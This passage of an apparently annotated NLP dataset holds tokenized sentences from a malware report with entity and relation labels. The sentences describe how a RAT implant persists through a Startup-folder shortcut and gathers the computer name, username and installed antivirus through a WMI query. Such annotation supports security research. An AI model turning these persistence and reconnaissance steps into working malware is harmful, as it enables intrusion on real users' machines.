"FR", "evidence": [6], "h": 18, "t": 20}, {"r": "RD", "evidence": [7], "h": 21, "t": 22}, {"r": "RF", "evidence": [7], "h": 21, "t": 23}, {"r": "RD", "evidence": [7], "h": 21, "t": 24}, {"r": "RD", "evidence": [7], "h": 21, "t": 24}, {"r": "WR", "evidence": [7], "h": 21, "t": 24}, {"r": "RD", "evidence": [7], "t": 24, "h": 25}, {"r": "WR", "evidence": [7], "t": 24, "h": 25}, {"r": "CO", "evidence": [7], "t": 23, "h": 25}]}, {"title": "628-4", "sents": [["Now", ",", "if", "the", "implant", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "skip", "the", "process", "for", "dropping", "and", "displaying", "the", "decoy", "document", "and", "jump", "straight", "to", "its", "RAT", "functionalities", "."], ["Establishing", "persistenceAnother", "timer", "is", "used", "to", "establish", "persistence", "for", "the", "implant", "on", "the", "endpoint", "."], ["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."], ["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."], ["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."], ["Information", "GatheringThe", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."], ["The", "sequence", "of", "actions", "followed", "for", "gathering", "system", "information", "from", "the", "endpoint", "are", "as", "follows", ":", "Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."], ["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "Gather", "the", "Computername", "and", "username", "from", "ENV", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "implant", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "-start", "pos": [10, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [25, 25], "name": "decoy document", "pos": [25, 27], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [37, 37], "name": "timer", "pos": [2, 3], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [45, 45], "name": "implant", "pos": [10, 11], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [48, 48], "name": "endpoint", "pos": [13, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [53, 53], "name": "implant", "pos": [3, 4], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [61, 61], "name": "command line", "pos": [11, 13], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [71, 71], "name": "shortcut", "pos": [21, 22], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [76, 76], "name": "% TEMP % directory", "pos": [26, 30], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [82, 82], "name": "shortcut", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [86, 86], "name": "implant", "pos": [5, 6], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [106, 106], "name": "shortcut", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [117, 117], "name": "Startup folder", "pos": [12, 14], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [131, 131], "name": "timers", "pos": [4, 5], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [136, 136], "name": "information", "pos": [9, 10], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [140, 140], "name": "RAT capabilities", "pos": [13, 15], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [149, 149], "name": "actions", "pos": [3, 4], "index": "17_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [153, 153], "name": "system information", "pos": [7, 9], "index": "18_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [157, 157], "name": "endpoint", "pos": [11, 12], "index": "19_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [164, 164], "name": "pc ID", "pos": [18, 20], "index": "20_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [169, 169], "name": "endpoint", "pos": [23, 24], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [176, 176], "name": "data file", "pos": [5, 7], "index": "22_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [190, 190], "name": "Computername", "pos": [19, 20], "index": "23_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [192, 192], "name": "username", "pos": [21, 22], "index": "24_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 3, "t": 5}, {"r": "FR", "evidence": [2], "h": 6, "t": 7}, {"r": "FR", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 7, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 10}, {"r": "EX", "evidence": [3], "h": 10, "t": 11}, {"r": "FR", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "RD", "evidence": [5], "h": 14, "t": 15}, {"r": "FR", "evidence": [5], "h": 14, "t": 16}, {"r": "RD", "evidence": [6], "h": 17, "t": 18}, {"r": "RF", "evidence": [6], "h": 17, "t": 19}, {"r": "RD", "evidence": [6], "h": 17, "t": 20}, {"r": "RD", "evidence": [6], "h": 17, "t": 20}, {"r": "WR", "evidence": [6], "h": 17, "t": 20}, {"r": "RD", "evidence": [6], "t": 20, "h": 21}, {"r": "WR", "evidence": [6], "t": 20, "h": 21}, {"r": "WR", "evidence": [6, 7], "h": 17, "t": 22}, {"r": "RD", "evidence": [6, 7], "h": 17, "t": 23}, {"r": "RD", "evidence": [6, 7], "h": 17, "t": 24}, {"r": "CO", "evidence": [6], "t": 19, "h": 21}]}, {"title": "628-5", "sents": [["Establishing", "persistenceAnother", "timer", "is", "used", "to", "establish", "persistence", "for", "the", "implant", "on", "the", "endpoint", "."], ["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."], ["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."], ["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."], ["Information", "GatheringThe", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."], ["The", "sequence", "of", "actions", "followed", "for", "gathering", "system", "information", "from", "the", "endpoint", "are", "as", "follows", ":", "Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."], ["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "Gather", "the", "Computername", "and", "username", "from", "ENV", "."], ["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost", "oot\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "timer", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "implant", "pos": [10, 11], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [13, 13], "name": "endpoint", "pos": [13, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "implant", "pos": [3, 4], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "command line", "pos": [11, 13], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "shortcut", "pos": [21, 22], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "% TEMP % directory", "pos": [26, 30], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [47, 47], "name": "shortcut", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [51, 51], "name": "implant", "pos": [5, 6], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [71, 71], "name": "shortcut", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [82, 82], "name": "Startup folder", "pos": [12, 14], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [96, 96], "name": "timers", "pos": [4, 5], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [101, 101], "name": "information", "pos": [9, 10], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [105, 105], "name": "RAT capabilities", "pos": [13, 15], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [114, 114], "name": "actions", "pos": [3, 4], "index": "14_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [118, 118], "name": "system information", "pos": [7, 9], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [122, 122], "name": "endpoint", "pos": [11, 12], "index": "16_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [129, 129], "name": "pc ID", "pos": [18, 20], "index": "17_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [134, 134], "name": "endpoint", "pos": [23, 24], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [141, 141], "name": "data file", "pos": [5, 7], "index": "19_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [155, 155], "name": "Computername", "pos": [19, 20], "index": "20_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [157, 157], "name": "username", "pos": [21, 22], "index": "21_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [163, 163], "name": "computername", "pos": [2, 3], "index": "22_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [165, 165], "name": "username", "pos": [4, 5], "index": "23_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [167, 167], "name": "pcid", "pos": [6, 7], "index": "24_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [184, 184], "name": "AV information", "pos": [23, 25], "index": "25_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [188, 188], "name": "endpoint", "pos": [27, 28], "index": "26_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 4, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "EX", "evidence": [2], "h": 7, "t": 8}, {"r": "FR", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "RD", "evidence": [4], "h": 11, "t": 12}, {"r": "FR", "evidence": [4], "h": 11, "t": 13}, {"r": "RD", "evidence": [5], "h": 14, "t": 15}, {"r": "RF", "evidence": [5], "h": 14, "t": 16}, {"r": "RD", "evidence": [5], "h": 14, "t": 17}, {"r": "RD", "evidence": [5], "h": 14, "t": 17}, {"r": "WR", "evidence": [5], "h": 14, "t": 17}, {"r": "RD", "evidence": [5], "t": 17, "h": 18}, {"r": "WR", "evidence": [5], "t": 17, "h": 18}, {"r": "WR", "evidence": [5, 6], "h": 14, "t": 19}, {"r": "RD", "evidence": [5, 6], "h": 14, "t": 20}, {"r": "RD", "evidence": [5, 6, 7], "h": 14, "t": 22}, {"r": "RD", "evidence": [5, 6], "h": 14, "t": 21}, {"r": "RD", "evidence": [5, 6, 7], "h": 14, "t": 23}, {"r": "WR", "evidence": [5, 6, 7], "h": 14, "t": 22}, {"r": "RD", "evidence": [5, 6, 7], "h": 14, "t": 24}, {"r": "WR", "evidence": [5, 6, 7], "h": 14, "t": 23}, {"r": "WR", "evidence": [5, 6, 7], "h": 14, "t": 24}, {"r": "WR", "evidence": [5, 6, 7], "h": 14, "t": 25}, {"r": "RF", "evidence": [5, 6, 7], "h": 14, "t": 26}, {"r": "CO", "evidence": [5, 6, 7], "h": 18, "t": 26}, {"r": "CO", "evidence": [5], "t": 16, "h": 18}]}, {"title": "628-6", "sents": [["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."], ["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."], ["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."], ["Information", "GatheringThe", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."], ["The", "sequence", "of", "actions", "followed", "for", "gathering", "system", "information", "from", "the", "endpoint", "are", "as", "follows", ":", "Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."], ["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "Gather", "the", "Computername", "and", "username", "from", "ENV", "."], ["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost", "oot\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."], ["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "implant", "pos": [3, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [11, 11], "name": "command line", "pos": [11, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [21, 21], "name": "shortcut", "pos": [21, 22], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [26, 26], "name": "% TEMP % directory", "pos": [26, 30], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "shortcut", "pos": [1, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "implant", "pos": [5, 6], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [56, 56], "name": "shortcut", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [67, 67], "name": "Startup folder", "pos": [12, 14], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [81, 81], "name": "timers", "pos": [4, 5], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [86, 86], "name": "information", "pos": [9, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [90, 90], "name": "RAT capabilities", "pos": [13, 15], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [99, 99], "name": "actions", "pos": [3, 4], "index": "11_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [103, 103], "name": "system information", "pos": [7, 9], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [107, 107], "name": "endpoint", "pos": [11, 12], "index": "13_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [114, 114], "name": "pc ID", "pos": [18, 20], "index": "14_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [119, 119], "name": "endpoint", "pos": [23, 24], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [126, 126], "name": "data file", "pos": [5, 7], "index": "16_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [140, 140], "name": "Computername", "pos": [19, 20], "index": "17_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [142, 142], "name": "username", "pos": [21, 22], "index": "18_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [148, 148], "name": "computername", "pos": [2, 3], "index": "19_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [150, 150], "name": "username", "pos": [4, 5], "index": "20_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [152, 152], "name": "pcid", "pos": [6, 7], "index": "21_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [169, 169], "name": "AV information", "pos": [23, 25], "index": "22_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [173, 173], "name": "endpoint", "pos": [27, 28], "index": "23_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [192, 192], "name": "AV information", "pos": [2, 4], "index": "24_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [0], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "EX", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [1, 2], "h": 4, "t": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "RD", "evidence": [3], "h": 8, "t": 9}, {"r": "FR", "evidence": [3], "h": 8, "t": 10}, {"r": "RD", "evidence": [4], "h": 11, "t": 12}, {"r": "RF", "evidence": [4], "h": 11, "t": 13}, {"r": "RD", "evidence": [4], "h": 11, "t": 14}, {"r": "RD", "evidence": [4], "h": 11, "t": 14}, {"r": "WR", "evidence": [4], "h": 11, "t": 14}, {"r": "RD", "evidence": [4], "t": 14, "h": 15}, {"r": "WR", "evidence": [4], "t": 14, "h": 15}, {"r": "WR", "evidence": [4, 5], "h": 11, "t": 16}, {"r": "RD", "evidence": [4, 5], "h": 11, "t": 17}, {"r": "RD", "evidence": [4, 5, 6], "h": 11, "t": 19}, {"r": "RD", "evidence": [4, 5], "h": 11, "t": 18}, {"r": "RD", "evidence": [4, 5, 6], "h": 11, "t": 20}, {"r": "WR", "evidence": [4, 5, 6], "h": 11, "t": 19}, {"r": "RD", "evidence": [4, 5, 6], "h": 11, "t": 21}, {"r": "WR", "evidence": [4, 5, 6], "h": 11, "t": 20}, {"r": "WR", "evidence": [4, 5, 6], "h": 11, "t": 21}, {"r": "WR", "evidence": [4, 5, 6], "h": 11, "t": 22}, {"r": "RF", "evidence": [4, 5, 6], "h": 11, "t": 23}, {"r": "CO", "evidence": [4, 5, 6], "h": 15, "t": 23}, {"r": "CO", "evidence": [4], "t": 13, "h": 15}, {"r": "CO", "evidence": [6, 7], "h": 22, "t": 24}]}, {"title": "628-7", "sents": [["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."], ["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."], ["Information", "GatheringThe", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."], ["The", "sequence", "of", "actions", "followed", "for", "gathering", "system", "information", "from", "the", "endpoint", "are", "as", "follows", ":", "Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."], ["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "Gather", "the", "Computername", "and", "username", "from", "ENV", "."], ["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost", "oot\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."], ["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."], ["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "shortcut", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "implant", "pos": [5, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [25, 25], "name": "shortcut", "pos": [1, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "Startup folder", "pos": [12, 14], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "timers", "pos": [4, 5], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "information", "pos": [9, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [59, 59], "name": "RAT capabilities", "pos": [13, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [68, 68], "name": "actions", "pos": [3, 4], "index": "7_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [72, 72], "name": "system information", "pos": [7, 9], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [76, 76], "name": "endpoint", "pos": [11, 12], "index": "9_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [83, 83], "name": "pc ID", "pos": [18, 20], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [88, 88], "name": "endpoint", "pos": [23, 24], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [95, 95], "name": "data file", "pos": [5, 7], "index": "12_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [109, 109], "name": "Computername", "pos": [19, 20], "index": "13_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [111, 111], "name": "username", "pos": [21, 22], "index": "14_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [117, 117], "name": "computername", "pos": [2, 3], "index": "15_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [119, 119], "name": "username", "pos": [4, 5], "index": "16_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [121, 121], "name": "pcid", "pos": [6, 7], "index": "17_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [138, 138], "name": "AV information", "pos": [23, 25], "index": "18_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [142, 142], "name": "endpoint", "pos": [27, 28], "index": "19_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [161, 161], "name": "AV information", "pos": [2, 4], "index": "20_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [170, 170], "name": "OS information", "pos": [1, 3], "index": "21_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "RD", "evidence": [2], "h": 4, "t": 5}, {"r": "FR", "evidence": [2], "h": 4, "t": 6}, {"r": "RD", "evidence": [3], "h": 7, "t": 8}, {"r": "RF", "evidence": [3], "h": 7, "t": 9}, {"r": "RD", "evidence": [3], "h": 7, "t": 10}, {"r": "RD", "evidence": [3], "h": 7, "t": 10}, {"r": "WR", "evidence": [3], "h": 7, "t": 10}, {"r": "RD", "evidence": [3], "t": 10, "h": 11}, {"r": "WR", "evidence": [3], "t": 10, "h": 11}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 12}, {"r": "RD", "evidence": [3, 4], "h": 7, "t": 13}, {"r": "RD", "evidence": [3, 4, 5], "h": 7, "t": 15}, {"r": "RD", "evidence": [3, 4], "h": 7, "t": 14}, {"r": "RD", "evidence": [3, 4, 5], "h": 7, "t": 16}, {"r": "WR", "evidence": [3, 4, 5], "h": 7, "t": 15}, {"r": "RD", "evidence": [3, 4, 5], "h": 7, "t": 17}, {"r": "WR", "evidence": [3, 4, 5], "h": 7, "t": 16}, {"r": "WR", "evidence": [3, 4, 5], "h": 7, "t": 17}, {"r": "WR", "evidence": [3, 4, 5], "h": 7, "t": 18}, {"r": "RF", "evidence": [3, 4, 5], "h": 7, "t": 19}, {"r": "RD", "evidence": [3, 4, 5, 6, 7], "h": 7, "t": 21}, {"r": "CO", "evidence": [3, 4, 5], "h": 11, "t": 19}, {"r": "CO", "evidence": [3], "t": 9, "h": 11}, {"r": "CO", "evidence": [5, 6], "h": 18, "t": 20}]}, {"title": "628-8", "sents": [["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."], ["Information", "GatheringThe", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."], ["The", "sequence", "of", "actions", "followed", "for", "gathering", "system", "information", "from", "the", "endpoint", "are", "as", "follows", ":", "Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."], ["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "Gather", "the", "Computername", "and", "username", "from", "ENV", "."], ["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">", "Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost", "oot\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."], ["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."], ["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."], ["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "shortcut", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "Startup folder", "pos": [12, 14], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "timers", "pos": [4, 5], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "information", "pos": [9, 10], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "RAT capabilities", "pos": [13, 15], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "actions", "pos": [3, 4], "index": "5_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [48, 48], "name": "system information", "pos": [7, 9], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [52, 52], "name": "endpoint", "pos": [11, 12], "index": "7_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [59, 59], "name": "pc ID", "pos": [18, 20], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [64, 64], "name": "endpoint", "pos": [23, 24], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [71, 71], "name": "data file", "pos": [5, 7], "index": "10_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [85, 85], "name": "Computername", "pos": [19, 20], "index": "11_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [87, 87], "name": "username", "pos": [21, 22], "index": "12_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [93, 93], "name": "computername", "pos": [2, 3], "index": "13_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [95, 95], "name": "username", "pos": [4, 5], "index": "14_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [97, 97], "name": "pcid", "pos": [6, 7], "index": "15_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [114, 114], "name": "AV information", "pos": [23, 25], "index": "16_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [118, 118], "name": "endpoint", "pos": [27, 28], "index": "17_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [137, 137], "name": "AV information", "pos": [2, 4], "index": "18_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [146, 146], "name": "OS information", "pos": [1, 3], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [159, 159], "name": "command line", "pos": [5, 7], "index": "20_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [1], "h": 2, "t": 3}, {"r": "FR", "evidence": [1], "h": 2, "t": 4}, {"r": "RD", "evidence": [2], "h": 5, "t": 6}, {"r": "RF", "evidence": [2], "h": 5, "t": 7}, {"r": "RD", "evidence": [2], "h": 5, "t": 8}, {"r": "RD", "evidence": [2], "h": 5, "t": 8}, {"r": "WR", "evidence": [2], "h": 5, "t": 8}, {"r": "RD", "evidence": [2], "t": 8, "h": 9}, {"r": "WR", "evidence": [2], "t": 8, "h": 9}, {"r": "WR", "evidence": [2, 3], "h": 5, "t": 10}, {"r": "RD", "evidence": [2, 3], "h": 5, "t": 11}, {"r": "RD", "evidence": [2, 3, 4], "h": 5, "t": 13}, {"r": "RD", "evidence": [2, 3], "h": 5, "t": 12}, {"r": "RD", "evidence": [2, 3, 4], "h": 5, "t": 14}, 